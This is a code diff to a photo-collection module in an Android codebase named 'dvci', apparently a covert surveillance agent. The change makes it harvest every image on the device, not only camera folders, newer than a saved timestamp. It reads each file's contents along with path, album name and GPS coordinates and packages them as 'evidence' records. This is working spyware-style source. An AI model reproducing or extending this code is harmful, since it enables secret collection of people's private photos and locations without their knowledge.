@@ -15,6 +15,7 @@ import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.interfaces.Observer;
+import com.android.dvci.listener.BC;
 import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.module.BaseModule;
 import com.android.dvci.util.Check;
@@ -25,6 +26,8 @@ import com.android.dvci.util.WChar;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.UnsupportedEncodingException;
+import java.nio.charset.Charset;
 import java.util.Date;
 import java.util.concurrent.Semaphore;
 
@@ -68,7 +71,6 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		ListenerProcess.self().detach(this);
 	}
 
-
 	private void fetchPhotos() {
 		if (!semaphorePhoto.tryAcquire()) {
 			if (Cfg.DEBUG) {
@@ -78,7 +80,7 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		}
 		try {
 			lastTimestamp = markupPhoto.unserialize(new Long(0));
-			long newtimestamp = getCameraPhoto(lastTimestamp);
+			long newtimestamp = getCameraImages(Status.getAppContext(), new ImageVisitor(), lastTimestamp);
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (fetchPhotos) serialize timestamp: " + newtimestamp);
@@ -87,32 +89,6 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 		} finally {
 			semaphorePhoto.release();
 		}
-	}
-
-	private long getCameraPhoto(long lastTimestamp) {
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCameraPhoto)");
-		}
-		Context context = Status.getAppContext();
-
-		String[] places = new String[]{"/DCIM/Camera", "/DCIM/100MEDIA"};
-		String environment = Environment.getExternalStorageDirectory().toString();
-
-
-		for (String place : places) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getCameraPhoto) try: " + place);
-			}
-			String cameraBucketName = environment + place;
-
-			String bucketID = getBucketId(cameraBucketName);
-
-			long bucketlast = getCameraImages(context, bucketID, new ImageVisitor());
-			lastTimestamp = Math.max(lastTimestamp, bucketlast);
-		}
-
-		return lastTimestamp;
 	}
 
 	@Override
@@ -127,13 +103,15 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 	class ImageVisitor {
 		long visitor(Cursor cursor) {
 			final int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
-			final int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED);
+			final int dateColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.DATE_TAKEN);
 			final int titleColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.TITLE);
 			final int mimeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE);
 
 
 			final int latColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LATITUDE);
 			final int lonColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.ImageColumns.LONGITUDE);
+
+			final int bucketColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
 
 			long last = 0;
 
@@ -145,83 +123,95 @@ public class ModulePhoto extends BaseModule implements Observer<ProcessInfo> {
 			final String lat = cursor.getString(latColumn);
 			final String lon = cursor.getString(lonColumn);
 
+			final String bucket = cursor.getString(bucketColumn);
+
 			AutoFile file = new AutoFile(path);
 
-			byte[] jpeg = file.read();
+			byte[] content = file.read();
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (visitor), " + path);
 			}
 
-			EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon), jpeg, date);
+			EvidenceBuilder.atomic(EvidenceType.PHOTO, getAdditionalData(title, path, mime, lat, lon, bucket), content, date);
+			content = null;
+
 
 			last = date.getTime();
 			return last;
 		}
 	}
 
-	/**
-	 * Matches code in MediaProvider.computeBucketValues. Should be a common
-	 * function.
-	 */
-	public static String getBucketId(String path) {
-		return String.valueOf(path.toLowerCase().hashCode());
-	}
-
-	public static long getCameraImages(Context context, String place, ImageVisitor visitor) {
+	public static long getCameraImages(Context context, ImageVisitor visitor, long lastTimestamp) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCameraImages) place: " + place);
+			Check.log(TAG + " (getCameraImages) lastTimestamp: " + lastTimestamp);
 		}
 
-		final String[] projection = {MediaStore.Images.Media.DATA};
-		final String selection = MediaStore.Images.Media.BUCKET_ID + " = ?";
-		final String[] selectionArgs = {place};
+		final String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.ImageColumns.DATE_TAKEN,
+				MediaStore.Images.Media.TITLE, MediaStore.Images.Media.MIME_TYPE,
+				MediaStore.Images.ImageColumns.LATITUDE, MediaStore.Images.ImageColumns.LONGITUDE,
+				MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
+		final String selection = MediaStore.Images.Media.DATE_TAKEN + " > ?";
+		final String[] selectionArgs = {Long.toString(lastTimestamp / 1000)};
+		final String order = MediaStore.Images.Media.DATE_TAKEN + " asc";
 		final Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
 				projection,
 				selection,
 				selectionArgs,
-				null);
-
-		long lasttimestamp = 0;
+				order);
 
 		if (cursor.moveToFirst()) {
 			do {
-				long last = visitor.visitor(cursor);
-				lasttimestamp = Math.max(last, lasttimestamp);
+				try {
+					long last = visitor.visitor(cursor);
+					lastTimestamp = Math.max(last, lastTimestamp);
+
+
+				} catch (Exception ex) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getCameraImages), ERROR: ", ex);
+					}
+				}
 
 			} while (cursor.moveToNext());
 		}
 		cursor.close();
-		return lasttimestamp;
+		return lastTimestamp;
 	}
 
+	private byte[] getAdditionalData(String title, String path, String mime, String lat, String lon, String bucket) {
 
-	private byte[] getAdditionalData(String title, String path, String mime, String lat, String lon) {
-
-		String json = "";
-
-		JSONObject data = new JSONObject();
+		//JSONObject data = new JSONObject();
 		JSONObject place = new JSONObject();
 		JSONObject main = new JSONObject();
 		try {
-			data.put("program", "photo");
-			data.put("path", path);
+			main.put("program", bucket);
+			main.put("path", path);
 
 			if (!StringUtils.isEmpty(lat) && !StringUtils.isEmpty(lon)) {
 				place.put("lat", lat);
 				place.put("lon", lon);
 			}
-
-			main.put("data", data);
 			main.put("description", title);
-			main.put("device", "android");
+			//main.put("device", "android");
 			main.put("mime", mime);
 
 		} catch (JSONException e) {
 			e.printStackTrace();
 		}
 
-		byte[] jsonByte = WChar.getBytes(json);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getAdditionalData), json: " + main.toString());
+		}
+
+		byte[] jsonByte = new byte[0];
+		try {
+			jsonByte = main.toString().getBytes("UTF-8");
+		} catch (UnsupportedEncodingException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getAdditionalData), cannot convert: ", e);
+			}
+		}
 
 		int tlen = jsonByte.length + 4;
 		final byte[] additionalData = new byte[tlen];
